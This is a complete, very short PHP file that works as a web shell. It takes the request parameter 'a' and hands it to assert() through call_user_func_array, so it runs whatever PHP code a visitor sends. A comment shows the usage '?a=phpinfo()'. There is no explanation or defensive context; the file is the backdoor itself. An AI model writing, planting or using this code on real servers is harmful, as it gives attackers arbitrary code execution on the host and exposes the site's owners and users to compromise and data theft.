<?php
//?a=phpinfo()
$a=$_REQUEST['a'];
$array[0]=$a;
call_user_func_array("assert",$array);
?>